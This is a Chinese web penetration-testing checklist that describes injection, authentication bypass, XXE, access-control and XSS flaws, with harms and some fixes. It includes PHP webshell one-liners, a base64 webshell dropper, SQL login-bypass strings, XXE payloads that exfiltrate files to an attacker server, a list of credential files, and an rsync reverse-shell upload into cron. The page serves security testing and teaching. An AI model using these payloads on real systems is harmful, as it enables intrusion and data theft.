+<li><ul>
+<li><a href="https://xz.aliyun.com/t/7692" target="_blank" rel="noopener">https://xz.aliyun.com/t/7692</a></li>
+</ul>
+</li>
+<li>进程注入 <a href="https://xz.aliyun.com/t/6210" target="_blank" rel="noopener">https://xz.aliyun.com/t/6210</a></li>
+<li>DNS注入 <a href="https://www.freebuf.com/articles/network/226091.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/226091.html</a></li>
+<li>CSV注入 <a href="https://www.freebuf.com/vuls/195656.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/195656.html</a></li>
+<li>DLL注入 <a href="https://bbs.pediy.com/thread-213722.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-213722.htm</a></li>
+<li>链接注入</li>
+<li>等等</li>
+</ul>
+<h3 id="0x11-SQL注入"><a href="#0x11-SQL注入" class="headerlink" title="0x11 SQL注入"></a>0x11 SQL注入</h3><p>描述：</p>
+<ul>
+<li>SQL注入攻击（SQL Injection），简称注入攻击、SQL注入，被广泛用于非法获取网站控制权，是发生在应用程序的数据库层上的安全漏洞。 在设计不良的程序当中，忽略了对输入字符串中夹带的SQL指令的检查，那么这些夹带进去的指令就会被数据库误认为是正常的SQL指令而运行， 从而使数据库受到攻击，可能导致数据被窃取、更改、删除，以及进一步导致网站被嵌入恶意代码、被植入后门程序等危害。</li>
+</ul>
+<p>危害：</p>
+<ul>
+<li>数据库数据被窃取</li>
+<li>核心业务数据被篡改</li>
+<li>网页被篡改</li>
+<li>数据库所在服务器被控制，服务器所在网络被入侵。</li>
+</ul>
+<p>基于服务器的响应分类</p>
+<ul>
+<li>报错注入</li>
+<li>联合查询注入</li>
+<li>堆查询注入 <a href="https://www.freebuf.com/articles/web/250705.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/250705.html</a></li>
+<li>SQL盲注（报错盲注、延时盲注）</li>
+</ul>
+<p>基于字符类型分类</p>
+<ul>
+<li>基于字符串</li>
+<li>基于数字</li>
+</ul>
+<p>基于深度分类</p>
+<ul>
+<li>一次注入</li>
+<li>二次注入 <a href="https://www.freebuf.com/articles/web/250490.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/250490.html</a></li>
+</ul>
+<p>基于注入位置分类</p>
+<ul>
+<li>GET注入</li>
+<li>POST注入</li>
+<li>cookie注入</li>
+<li>其他header注入</li>
+<li><ul>
+<li><a href="https://www.freebuf.com/articles/network/179363.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/179363.html</a></li>
+</ul>
+</li>
+<li><ul>
+<li><a href="https://www.freebuf.com/articles/web/105124.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/105124.html</a></li>
+</ul>
+</li>
+</ul>
+<p>具体到位置分类</p>
+<ul>
+<li>查询处注入</li>
+<li>搜索框注入</li>
+<li>登录用户名密码注入</li>
+<li>隐藏参数或固定参数注入</li>
+</ul>
+<h3 id="0x12-LDAP注入"><a href="#0x12-LDAP注入" class="headerlink" title="0x12 LDAP注入"></a>0x12 LDAP注入</h3><p><a href="https://xz.aliyun.com/t/5689" target="_blank" rel="noopener">https://xz.aliyun.com/t/5689</a></p>
+<h3 id="0x13-CRLF注入"><a href="#0x13-CRLF注入" class="headerlink" title="0x13 CRLF注入"></a>0x13 CRLF注入</h3><p>描述：</p>
+<ul>
+<li>HTTP响应拆分漏洞，也叫CRLF注入攻击。CR、LF分别对应回车、换行字符。</li>
+<li>HTTP头由很多被CRLF组合分离的行构成，每行的结构都是“键：值”。</li>
+<li>如果用户输入的值部分注入了CRLF字符，它有可能改变的HTTP报头结构。</li>
+</ul>
+<p>危害：</p>
+<ul>
+<li>攻击者可能注入自定义HTTP头。例如，攻击者可以注入会话cookie或HTML代码。这可能会进行类似的XSS（跨站点脚本）或会话固定漏洞。</li>
+</ul>
+<p><a href="https://www.freebuf.com/articles/web/202762.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/202762.html</a></p>
+<h3 id="0x14-代码注入"><a href="#0x14-代码注入" class="headerlink" title="0x14 代码注入"></a>0x14 代码注入</h3><p>描述：</p>
+<ul>
+<li>代码注入是指由于服务端代码漏洞导致恶意用户输入在服务端被执行的一种高危安全漏洞。</li>
+</ul>
+<p>危害：</p>
+<ul>
+<li>利用该漏洞，可以在服务器上执行攻击者拼装的代码。</li>
+</ul>
+<p><a href="https://xz.aliyun.com/t/8231" target="_blank" rel="noopener">https://xz.aliyun.com/t/8231</a></p>
+<p><strong>PHP GET例子：</strong><br>代码执行函数：<code>eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()</code><br>命令执行函数：<code>system()、exec()、popen()、passthru()、shell_exec()、proc_open()</code></p>
+<pre><code>&lt;?php @eval($_GET[&quot;cmd&quot;]);
+&lt;?php @assert($_GET[&quot;cmd&quot;]);
+&lt;?php $func =create_function(&#39;&#39;,$_GET[&#39;cmd&#39;]);$func();
+&lt;?php call_user_func(&quot;assert&quot;,$_GET[&#39;cmd&#39;]);
+&lt;?php preg_replace(&quot;/test/e&quot;,$_GET[&quot;cmd&quot;],&quot;jutst test&quot;);
+
+cmd=system(whoami); #执行系统命令
+cmd=fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(base64_decode(UEQ5d2FIQWdEUXBBSkhSbGJYQWdQU0FrWDBaSlRFVlRXeWQxY0d4dllXUmZabWxzWlNkZFd5ZDBiWEJmYm1GdFpTZGRPdzBLUUNSbWFXeGxJRDBnWW1GelpXNWhiV1VvSkY5R1NVeEZVMXNuZFhCc2IyRmtYMlpwYkdVblhWc25ibUZ0WlNkZEtUc05DbWxtSUNobGJYQjBlU0FvSkdacGJHVXBLWHNOQ21WamFHOGdJanhtYjNKdElHRmpkR2x2YmlBOUlDY25JRzFsZEdodlpDQTlJQ2RRVDFOVUp5QkZUa05VV1ZCRlBTZHRkV3gwYVhCaGNuUXZabTl5YlMxa1lYUmhKejVjYmlJN1pXTm9ieUFpVEc5allXd2dabWxzWlRvZ1BHbHVjSFYwSUhSNWNHVWdQU0FuWm1sc1pTY2dibUZ0WlNBOUlDZDFjR3h2WVdSZlptbHNaU2MrWEc0aU8yVmphRzhnSWp4cGJuQjFkQ0IwZVhCbElEMGdKM04xWW0xcGRDY2dkbUZzZFdVZ1BTQW5WWEJzYjJGa0p6NWNiaUk3WldOb2J5QWlQQzltYjNKdFBseHVQSEJ5WlQ1Y2JseHVQQzl3Y21VK0lqdDlaV3h6WlNCN2FXWW9iVzkyWlY5MWNHeHZZV1JsWkY5bWFXeGxLQ1IwWlcxd0xDUm1hV3hsS1NsN1pXTm9ieUFpUm1sc1pTQjFjR3h2WVdSbFpDQnpkV05qWlhOelpuVnNiSGt1UEhBK1hHNGlPMzFsYkhObElIdGxZMmh2SUNKVmJtRmliR1VnZEc4Z2RYQnNiMkZrSUNJZ0xpQWtabWxzWlNBdUlDSXVQSEErWEc0aU8zMTlQejQ9))); #写入上传马
+
+&lt;?php 
+$func=$_GET[&#39;func&#39;];
+$cmd=$_GET[&#39;cmd&#39;];
+$array[0]=$cmd;
+$new_array=array_map($func,$array);
+echo $new_array;
+
+?func=system&amp;cmd=whoami
+
+&lt;?php
+$cmd=$_GET[&#39;cmd&#39;];
+$array[0]=$cmd;
+call_user_func_array(&quot;assert&quot;,$array);
+
+cmd=system(whoami);
+
+&lt;?php
+$cmd=$_GET[&#39;cmd&#39;];
+$array1=array($cmd);
+$func =$_GET[&#39;func&#39;];
+array_filter($array1,$func);
+
+?func=system&amp;cmd=whoami
+
+&lt;?php
+usort($_GET,&#39;asse&#39;.&#39;rt&#39;);
+
+?1=eval($_GET[cmd])&amp;cmd=system(whoami);
+</code></pre><h3 id="框架注入"><a href="#框架注入" class="headerlink" title="框架注入"></a>框架注入</h3><p>描述：</p>
+<ul>
+<li>攻击者可能注入含有恶意内容的frame或iframe标记。用户不够谨慎或未注意，可能就浏览该标记，却未意识到自己会离开原站点而进入恶意的站点，攻击者就可以诱导用户再次登录来获取用户登录凭证。</li>
+</ul>
+<p>危害：</p>
+<ul>
+<li>用户信息可能被窃取泄露。</li>
+</ul>
+<ol>
+<li>存在XSS的地方很可能存在该漏洞。</li>
+</ol>
+<p>例子：<code>&#39;&quot;&gt;&lt;iframe src=&quot;https://www.baidu.com&quot; width=&quot;900&quot; height=&quot;300&quot; scrolling=&quot;yes&quot;&gt;baidu&lt;/iframe&gt;</code></p>
+<p>修复建议：</p>
+<ul>
+<li>转义或过滤相关关键字或字符：frame、iframe、|、&amp;、;、$、%、@、’、”、&lt;&gt;、()、,、\、CR、LF、+等等</li>
+</ul>
+<h3 id="链接注入"><a href="#链接注入" class="headerlink" title="链接注入"></a>链接注入</h3><p><a href="https://www.cnblogs.com/xiayahui/p/4543910.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiayahui/p/4543910.html</a></p>
+<h2 id="0x20-失效的身份认证"><a href="#0x20-失效的身份认证" class="headerlink" title="0x20 失效的身份认证"></a>0x20 失效的身份认证</h2><h2 id="身份认证漏洞"><a href="#身份认证漏洞" class="headerlink" title="身份认证漏洞"></a>身份认证漏洞</h2><ul>
+<li>万能密码：’or’=’or’、admin’#、or 1=1–、admin’/*、admin’ or ‘1’=’1</li>
+<li>burpsuite抓包 把 密码字段 删除 或 改为空值 再发送</li>
+<li>用户名可枚举、密码可暴力破解（无验证码）：burpsuite爆破、burpsuite响应时间、用户注册</li>
+<li>明确的登录失败提示：用户名未注册、用户名不存在、密码错误</li>
+<li>到达登录错误次数封IP：X-Forwarded-For: IP  <a href="https://bbs.ichunqiu.com/thread-32747-1-7.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-32747-1-7.html</a></li>
+<li>到达登录错误次数封IP：已有低权限的正确账号密码test，爆破高权限的账号admin密码，登录限制错误次数3次封IP，burpsuite爆破模式Pitchfork，用户字典（例子）：admin admin test admin admin test…，123456 password test passwd 123123 test…，目的：使用test登录成功来清零登录错误次数</li>
+<li>短时间内请求次数太多封IP：burpsuite POST数据以json格式的请求</li>
+<li>到达登录错误次数锁定帐号：假设只允许3次，那密码字典就设高频率的3个</li>
+<li>绕过双因子认证：账号密码登录后，提示动态口令（OTP：0000至9999的4位数字）或其他验证，F12即可看到后台内容</li>
+<li>绕过双因子认证：burpsuite抓包，爆破OTP</li>
+<li>越权绕过双因子认证：burpsuite抓包，替换cookie中的用户名，去爆破其他用户名的验证口令</li>
+<li>任意用户重置密码：只有用户id/用户名和加密字符串（验证身份的cookie、session或token是万能的），修改用户id或用户名即可修改该用户的密码</li>
+<li>任意用户重置密码：验证身份的cookie、session或token可删除</li>
+<li>简单的响应状态：响应包中的true/false、1/0、success/fail、1/2，发送至repeater修改后重放</li>
+<li>简单的响应码可能会绕过登录：响应包中存在代表身份或状态的code，修改或爆破可能直接登录</li>
+<li>任意用户注册 或 用户注册信息覆盖：不校验用户注册信息</li>
+<li>用户名 或 密码 等字段存在SQL注入：burpsuite抓包保存到文件，sqlmap -r 文件</li>
+<li>二次注入：存在用户admin，注册用户admin’#或admin   ，登录后可对admin密码修改</li>
+<li>用户名 或 密码 等字段存在XSS</li>
+<li>CSRF</li>
+<li>未授权访问：目录扫描、手动添加常见后台路径或文件、JS接口</li>
+<li>参数Fuzz：burpsuite抓包手动改变参数admin=1、admin=isLogin、或删除admin字段</li>
+<li>会话长期有效，未及时刷新</li>
+</ul>
+<h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><ul>
+<li>用户名可枚举、密码可暴力破解（验证码不失效）：burpsuite爆破、burpsuite响应时间</li>
+<li>找回密码，仅验证验证码是否正确</li>
+<li>找回密码，不验证旧密码 或 burpsuite 删除旧密码字段</li>
+<li>手机号可枚举：找回密码，仅验证手机号是否已存在</li>
+<li>手机号找回密码，只验证验证码，不验证手机号码是否正确</li>
+<li>手机号找回密码，无验证码或验证码不失效、短信验证码无错误次数限制或无时间限制：爆破短信验证码</li>
+<li>找回密码，可通过burpsuite抓包，直接在请求包中获取到验证码</li>
+<li>可直接修改接收验证码的手机号或邮箱</li>
+<li>绕过验证码本地验证：服务器只判断客户端验证码是否验证成功的</li>
+<li>验证码易识别：工具自动识别</li>
+<li>绕过验证码：输入用户名后，等验证码时，F12查看前端代码获取重置密码的URL来绕过验证验证码步骤</li>
+<li>短信轰炸/邮件轰炸：登录处或找回密码处存在短信验证码或邮件验证码，burpsuite抓包重放</li>
+</ul>
+<h2 id="0x30-敏感信息泄露"><a href="#0x30-敏感信息泄露" class="headerlink" title="0x30 敏感信息泄露"></a>0x30 敏感信息泄露</h2><p>描述：</p>
+<ul>
+<li>很多Web应用程序和API都无法正确保护敏感数据，如：用户数据、医疗数据、财务数据等。</li>
+</ul>
+<p>危害：</p>
+<ul>
+<li>未加密或弱加密的数据容易被识别和利用，攻击者可能通过窃取或修改未加密的数据来身份窃取、实施欺骗或其他攻击真实用户行为。</li>
+</ul>
+<ul>
+<li>明文传输（没有强制使用TLS或使用弱加密算法）（敏感信息：用户账号、密码、身份证号码、手机号码、邮箱号码、银行账户、社保账号、个人信息等等）</li>
+<li>表单破解漏洞（对敏感信息进行加密的算法可破解）</li>
+<li>明文存储敏感信息（本地文件明文保存敏感信息、数据库明文保存账号密码）</li>
+<li>用户名密码 写入 前端，F12 或 view-source: 可能会查看到注释中保留账号密码、JS文件中信息泄露</li>
+<li>登录账号密码前端加密：burpsuite加前端加密算法插件，爆破</li>
+<li>报错页面敏感信息泄露</li>
+<li>HTTP头敏感信息泄露</li>
+<li>中间件版本泄露</li>
+<li>数据库版本泄露</li>
+<li>web配置文件泄露：phpinfo、PHP探针、config文件、ini文件</li>
+<li>压缩（源码）文件泄露</li>
+<li>日志文件泄露</li>
+<li>测试文件泄露</li>
+<li>接口泄露</li>
+<li>druid</li>
+<li>…</li>
+</ul>
+<h2 id="0x40-XML外部实体注入攻击（XXE）"><a href="#0x40-XML外部实体注入攻击（XXE）" class="headerlink" title="0x40 XML外部实体注入攻击（XXE）"></a>0x40 XML外部实体注入攻击（XXE）</h2><p><a href="https://www.freebuf.com/articles/network/225780.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/225780.html</a><br>描述：</p>
+<ul>
+<li>如果攻击者可以上传XML文档或者在XML文档中添加恶意内容，通过易受攻击的代码、依赖项或集成，他们就能够攻击含有缺陷的XML处理器。</li>
+</ul>
+<p>危害：</p>
+<ul>
+<li>XXE缺陷可用于提取数据、执行远程服务器请求、扫描内部系统、执行拒绝服务攻击和其他攻击。</li>
+</ul>
+<p>防御：</p>
+<ul>
+<li>开发人员培训是识别和减少XXE缺陷的关键，此外，防止XXE 缺陷还需要：</li>
+<li><ul>
+<li>尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。</li>
+</ul>
+</li>
+<li><ul>
+<li>及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。同时，通过依赖项检测，将SOAP更新到1.2版本或更高版本。</li>
+</ul>
+</li>
+<li><ul>
+<li>参考《 OWASP Cheat Sheet ‘XXE Prevention’》，在应用程序的所有XML解析器中禁用XML外部实体和DTD进程。</li>
+</ul>
+</li>
+<li><ul>
+<li>在服务器端实施积极的（“白名单”）输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。</li>
+</ul>
+</li>
+<li><ul>
+<li>验证XML或XSL文件上传功能是否使用XSD验证或其他类似验证方法来验证上传的XML文件。</li>
+</ul>
+</li>
+<li><ul>
+<li>尽管在许多集成环境中，手动审计复杂应用程序的代码。</li>
+</ul>
+</li>
+<li><ul>
+<li>考虑使用虚拟修复程序、API安全网关或Web应用程序防火墙（WAF）来检测、监控和防止XXE攻击。</li>
+</ul>
+</li>
+</ul>
+<p>有回显XXE——文件读取</p>
+<pre><code>payload：
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE aaa[
+[!ENTITY bbb SYSTEM &quot;file:///path/filename&quot;]
+]&gt;
+&lt;a&gt;&amp;bbb;&lt;/a&gt;
+
+例子：
+file:///etc/passwd
+http://127.0.0.1/1.txt
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+</code></pre><p>无回显XXE-文件读取<br><a href="https://blog.csdn.net/solitary_sen/article/details/99707618" target="_blank" rel="noopener">https://blog.csdn.net/solitary_sen/article/details/99707618</a></p>
+<pre><code>例子：（server：192.168.111.8）xxe.php
+&lt;?php 
+libxml_disable_entity_loader(false);
+$xmlfile=file_get_contents(&#39;php://input&#39;);
+$dom=new DOMDocument();
+$dom-&gt;loadXML($xmlfile,LIBXML_NOENT|LIBXML_DTDLOAD);
+?&gt;
+
+vps（192.168.111.1）的xxe.dtd
+&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/phpStudy/PHPTutorial/WWW/1.php&quot;&gt;
+&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://192.168.111.1?%file;&#39;&gt;&quot;&gt;
+
+payload：
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE convert [
+&lt;!ENTITY % local SYSTEM &quot;http://192.168.111.1/xxe.dtd&quot;&gt;
+%local;
+%dtd;
+%send;
+]&gt;</code></pre><p><img src="/Web-CheckList/%E6%97%A0%E5%9B%9E%E6%98%BEXXE.png" alt><br><img src="/Web-CheckList/%E6%97%A0%E5%9B%9E%E6%98%BEXXE2.png" alt></p>
+<p>XXE-内网探测（根据80端口开放及响应时间判断存活主机）</p>
+<pre><code>例子：（server：192.168.111.8）xxe.php
+&lt;?php 
+libxml_disable_entity_loader(false);
+$xmlfile=file_get_contents(&#39;php://input&#39;);
+$dom=new DOMDocument();
+$dom-&gt;loadXML($xmlfile,LIBXML_NOENT|LIBXML_DTDLOAD);
+?&gt;
+
+vps（192.168.111.1）的xxe.dtd
+&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://192.168.111.$i:80/&quot;&gt; #i：1-254
+&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://192.168.111.1?%file;&#39;&gt;&quot;&gt;
+
+payload：
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE convert [
+&lt;!ENTITY % local SYSTEM &quot;http://192.168.111.1/xxe.dtd&quot;&gt;
+%local;
+%dtd;
+%send;
+]&gt;</code></pre><h2 id="0x50-失效的访问控制"><a href="#0x50-失效的访问控制" class="headerlink" title="0x50 失效的访问控制"></a>0x50 失效的访问控制</h2><p>描述：</p>
+<ul>
+<li>失效的访问控制，指未对需要身份验证的用户实施恰当的访问控制。</li>
+<li>水平权限越权攻击</li>
+<li>垂直权限越权攻击</li>
+</ul>
+<p>危害：</p>
+<ul>
+<li>攻击者可能利用这些缺陷访问未经授权的功能或数据（如：访客访问其他用户的账户、查看敏感文件或数据、新增修改或删除其他用户文件或数据、越权对数据库增删改查等等），甚至导致服务器完全被控制，影响用户和服务器的信息安全。</li>
+</ul>
+<p><strong>目录遍历漏洞</strong><br>描述：</p>
+<ul>
+<li>目录遍历漏洞是由于网站存在配置缺陷，导致网站目录可以被任意浏览，这会导致网站很多隐私文件与目录泄露，比如数据库备份文件、配置文件等，攻击者利用获取到的信息为进一步入侵网站做准备。</li>
+</ul>
+<p>危害：</p>
+<ul>
+<li>攻击者访问某个网站目录时目录可列出目录下所有文件及子文件夹，将网站结构完全暴露给攻击者； 攻击者可能通过浏览目录结构，访问到某些隐秘文件（如PHPINFO文件、服务器探针文件、网站管理员后台访问地址、数据库连接文件等）。</li>
+</ul>
+<p>修复：</p>
+<ul>
+<li>严格检查文件路径参数，将其限制在指定的范围；不要允许用户控制与文件路径相关的参数。</li>
+<li>IIS中关闭目录浏览功能：在IIS的网站属性中，勾去“目录浏览”选项，重启IIS。</li>
+<li>Apache中关闭目录浏览功能：打开Apache配置文件httpd.conf，查找“Options Indexes<br>FollowSymLinks”，修改为“ Options -Indexes”(减号表示取消，保存退出，重启Apache)。</li>
+<li>ginx中默认不会开启目录浏览功能，若您发现当前已开启该功能，可以编辑nginx.conf文件，删除如下两行：autoindex on;autoindex_exact_size on，然后重启Nginx。</li>
+</ul>
+<p><strong>任意文件读取或下载漏洞</strong><br>描述：</p>
+<ul>
+<li>任意文件读取/下载漏洞比目录遍历漏洞危害更大，不仅会泄露网站的目录结构，而且攻击者可以直接获得网站文件的内容。攻击者可以因此获取到很多机密的文件，比如配置文件，比如 /etc/passwd、/root/.bash_history文件等。</li>
+</ul>
+<p>危害：</p>
+<ul>
+<li>下载服务器任意文件，如脚本代码、服务及系统配置文件等。可用得到的代码进一步代码审计，得到更多可利用漏洞。</li>
+</ul>
+<p>例子：<br>通过../遍历服务器目录，遍历服务器目录，下载相关文件。</p>
+<p><strong>常见敏感目录及文件</strong></p>
+<pre><code>C:\boot.ini  //查看系统版本
+C:\Windows\System32\inetsrv\MetaBase.xml  //IIS配置文件
+C:\Windows\repair\sam  //存储系统初次安装的密码
+C:\Program Files\mysql\my.ini  //Mysql配置
+C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root
+C:\Windows\php.ini  //php配置信息
+C:\Windows\my.ini  //Mysql配置信息
+
+/root/.ssh/authorized_keys   
+/root/.ssh/id_rsa  
+/root/.ssh/id_ras.keystore
+/root/.ssh/known_hosts
+/etc/passwd             查看用户文件文件
+/etc/shadow             查看密码文件
+/etc/my.cnf 
+/etc/httpd/conf/httpd.conf   查看apache的配置文件
+/root/.bash_history          查看历史命令
+/root/.mysql_history
+/proc/self/fd/fd[0-9]*(文件标识符)
+/proc/mounts
+/porc/config.gz</code></pre><ol>
+<li>后台未授权访问</li>
+<li><ul>
+<li>通过默认的后台路径，可直接访问：（例子：旧版本的Jenkins、jboss）</li>
+</ul>
+</li>
+<li><ul>
+<li>目录枚举后台路径，可直接访问</li>
+</ul>
+</li>
+<li>水平越权</li>
+<li><ul>
+<li>登录后，查看个人信息，修改个人的用户ID或其他用户身份标识字符来查看其他用户的个人信息。</li>
+</ul>
+</li>
+<li>垂直越权</li>
+<li><ul>
+<li>未登录的情况下，可直接其他用户的私人页面或管理页面</li>
+</ul>
+</li>
+<li><ul>
+<li>低权限用户登录后，将会话改成管理员会话且成功访问管理员的页面或操作管理员的功能。</li>
+</ul>
+</li>
+</ol>
+<p>其他：</p>
+<ul>
+<li>445 smb（samba）未授权访问：MSF、CVE-2017-7494</li>
+<li>873 Rsync未授权访问</li>
+<li><ul>
+<li>rsync rsync://IP:873/</li>
+</ul>
+</li>
+<li><ul>
+<li>rsync rsync://IP:873/目录</li>
+</ul>
+</li>
+<li><ul>
+<li>rsync rsync://IP:873/目录/etc/passwd ./ #下载文件到本地</li>
+</ul>
+</li>
+<li><ul>
+<li>rsync -av reverse_shell rsync://IP:873/目录/etc/cron.hourly #上传文件到服务器</li>
+</ul>
+</li>
+<li>888 宝塔未授权访问</li>
+<li><ul>
+<li>curl <a href="http://ip:888/pma" target="_blank" rel="noopener">http://ip:888/pma</a> </li>
+</ul>
+</li>
+<li>2049 NFS未授权访问</li>
+<li><ul>
+<li>showmount -e IP #列出已有目录</li>
+</ul>
+</li>
+<li><ul>
+<li>mount -t nfs IP:/已有目录 本地目录 #挂载到本地</li>
+</ul>
+</li>
+<li><ul>
+<li>umount 本地目录 #卸载</li>
+</ul>
+</li>
+<li><ul>
+<li>rmount 本地目录</li>
+</ul>
+</li>
+<li>2181 ZooKeeper未授权访问</li>
+<li><ul>
+<li>echo envi | nc ip port</li>
+</ul>
+</li>
+<li>2375 docker未授权访问</li>
+<li><ul>
+<li>docker -H tcp://IP:2375 version </li>
+</ul>
+</li>
+<li>5900 VNC未授权访问</li>
+<li><ul>
+<li>vncviewer IP</li>
+</ul>
+</li>
+<li>5984 CouchDB未授权访问</li>
+<li><ul>
+<li>curl <a href="http://IP:5984/" target="_blank" rel="noopener">http://IP:5984/</a></li>
+</ul>
+</li>
+<li><ul>
+<li>curl <a href="http://IP:5984/_config" target="_blank" rel="noopener">http://IP:5984/_config</a></li>
+</ul>
+</li>
+<li>6379 redis未授权访问：写webshell、写ssh key、反弹shell、写定时任务等等</li>
+<li>8088 Hadoop未授权访问</li>
+<li><ul>
+<li>curl <a href="http://IP:8088/cluster" target="_blank" rel="noopener">http://IP:8088/cluster</a></li>
+</ul>
+</li>
+<li>8888 Jupyter Notebook未授权访问</li>
+<li><ul>
+<li>curl <a href="http://IP:8888/" target="_blank" rel="noopener">http://IP:8888/</a></li>
+</ul>
+</li>
+<li>9200 Elasticsearch未授权访问</li>
+<li><ul>
+<li>curl <a href="http://IP:9200/" target="_blank" rel="noopener">http://IP:9200/</a></li>
+</ul>
+</li>
+<li><ul>
+<li>curl <a href="http://IP:9200/_nodes" target="_blank" rel="noopener">http://IP:9200/_nodes</a></li>
+</ul>
+</li>
+<li>11211 Memcached未授权访问</li>
+<li><ul>
+<li>nc -vv IP 11211</li>
+</ul>
+</li>
+<li>27017 mongodb未授权访问</li>
+<li>…</li>
+</ul>
+<h2 id="0x60-安全配置错误"><a href="#0x60-安全配置错误" class="headerlink" title="0x60 安全配置错误"></a>0x60 安全配置错误</h2><p>描述：</p>
+<ul>
+<li>由于不安全的默认配置、不完整的临时配置、开源云存储、错误的HTTP标头配置以及包含敏感信息的详细错误信息所造成的。</li>
+</ul>
+<p>危害：</p>
+<ul>
+<li>攻击者通过未修复的漏洞、不安全的配置、默认账号、不再使用或遗漏的页面、未设置访问权限的文件或目录等来获取到对系统的未授权访问。</li>
+</ul>
+<ol>
+<li>应用服务器、应用程序服务器、应用程序框架、数据库等未进行安全配置或加固。</li>
+<li>开放不必要的端口。</li>
+<li><ul>
+<li>22、135、137、138、139、445、1433、1521、3306、3389等等</li>
+</ul>
+</li>
+<li>使用默认账号密码。</li>
+<li><ul>
+<li>弱口令：admin/admin、root/root、admin/123456、administrator/123456等等</li>
+</ul>
+</li>
+<li><ul>
+<li>空口令</li>
+</ul>
+</li>
+<li>错误处理机制导致错误信息中显示敏感信息。</li>
+<li><ul>
+<li>错误信息中版本信息泄露</li>
+</ul>
+</li>
+<li><ul>
+<li>错误信息中数据库信息泄露</li>
+</ul>
+</li>
+<li>HTTP响应头敏感信息泄露</li>
+<li>不安全的HTTP请求方法</li>
+<li><ul>
+<li>GET/POST/HEAD</li>
+</ul>
+</li>
+<li>cookie中敏感信息泄露</li>
+<li>cookie中JWT安全问题 <a href="https://www.cnblogs.com/r00tuser/p/12513046.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/12513046.html</a></li>
+<li>Crossdomain.xml 配置不当</li>
+<li>正在使用的应用软件未更新且易受攻击。</li>
+<li>服务器不发送安全标头，或未对服务器进行安全配置。</li>
+<li><ul>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/X-Frame-Options" target="_blank" rel="noopener">X-Frame-Options</a></li>
+</ul>
+</li>
+<li><ul>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">Content Security Policy</a></li>
+</ul>
+</li>
+<li><ul>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Content-Type-Options" target="_blank" rel="noopener">X-Content-Type-Options</a></li>
+</ul>
+</li>
+<li><ul>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-XSS-Protection" target="_blank" rel="noopener">X-XSS-Protection</a></li>
+</ul>
+</li>
+<li><ul>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS" target="_blank" rel="noopener">HTTP access control (CORS)</a></li>
+</ul>
+</li>
+<li><ul>
+<li>…</li>
+</ul>
+</li>
+</ol>
+<h3 id="0x61-URL跳转漏洞"><a href="#0x61-URL跳转漏洞" class="headerlink" title="0x61 URL跳转漏洞"></a>0x61 URL跳转漏洞</h3><p>描述：</p>
+<ul>
+<li>URL 跳转漏洞指 Web 程序直接跳转到参数中的 URL，或在页面中引入了任意的开发者 URL 。</li>
+</ul>
+<p>修复：</p>
+<ul>
+<li>在控制页面转向的地方校验传入的 URL 是否为可信域名。</li>
+</ul>
+<h2 id="0x70-跨站脚本（XSS）"><a href="#0x70-跨站脚本（XSS）" class="headerlink" title="0x70 跨站脚本（XSS）"></a>0x70 跨站脚本（XSS）</h2><p>描述：</p>
+<ul>
+<li>跨站脚本攻击（Cross-site scripting，通常简称为XSS）发生在客户端，可被用于进行窃取隐私、钓鱼欺骗、偷取密码、传播恶意代码等攻击行为。 恶意的攻击者将对客户端有危害的代码放到服务器上作为一个网页内容， 使得其他网站用户在观看此网页时，这些代码注入到了用户的浏览器中执行，使用户受到攻击。一般而言，利用跨站脚本攻击，攻击者可窃会话COOKIE从而窃取网站用户的隐私，包括密码。</li>
+<li>XSS攻击使用到的技术主要为HTML和Javascript，也包括VBScript和ActionScript等。XSS攻击对WEB服务器虽无直接危害，但是它借助网站进行传播，使网站的使用用户受到攻击，导致网站用户帐号被窃取，从而对网站也产生了较严重的危害。</li>
+</ul>
+<p>危害：</p>
+<ul>
+<li>1） 钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者注入钓鱼JavaScript以监控目标网站的表单输入，甚至发起基于DHTML更高级的钓鱼攻击方式。</li>
+<li>2） 网站挂马：跨站时利用IFrame嵌入隐藏的恶意网站或者将被攻击者定向到恶意网站上，或者弹出恶意网站窗口等方式都可以进行挂马攻击。</li>
+<li>3） 身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS可以盗取到用户的Cookie，从而利用该Cookie盗取用户对该网站的操作权限。如果一个网站管理员用户Cookie被窃取，将会对网站引发巨大的危害。</li>
